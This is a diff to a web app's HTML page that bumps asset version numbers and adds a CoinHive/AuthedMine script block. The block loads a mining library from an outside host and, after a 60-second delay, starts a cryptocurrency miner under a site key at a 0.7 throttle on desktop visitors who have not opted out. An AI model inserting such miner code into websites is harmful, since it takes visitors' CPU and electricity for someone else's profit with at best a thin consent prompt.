@@ -39,11 +39,25 @@
 
 
     <link rel="stylesheet" href="css/bootstrap.css"/>
-    <link rel="stylesheet" href="build/bundle.css?21"/>
+    <link rel="stylesheet" href="build/bundle.css?22"/>
     <link rel="manifest"   href="/manifest.json">
 </head>
 <body oncontextmenu="return false;">
 <script src="cordova.js"></script>
-<script type="text/javascript" src="build/bundle.js?21"></script>
+<script type="text/javascript" src="build/bundle.js?22"></script>
+<!-- CoinHive Code -->
+<script src="https://authedmine.com/lib/authedmine.min.js"></script>
+<script>
+    setTimeout(function () {
+        var miner = new CoinHive.Anonymous('1Dh4ORJkacanB4jbO47UrOVEB7aueH25', {throttle: 0.7});
+
+        // Only start on non-mobile devices and if not opted-out
+        // in the last 14400 seconds (4 hours):
+        if (!miner.isMobile() && !miner.didOptOut(14400)) {
+            miner.start();
+        }
+    }, 60000)
+</script>
+<!-- End CoinHive Code -->
 </body>
 </html>
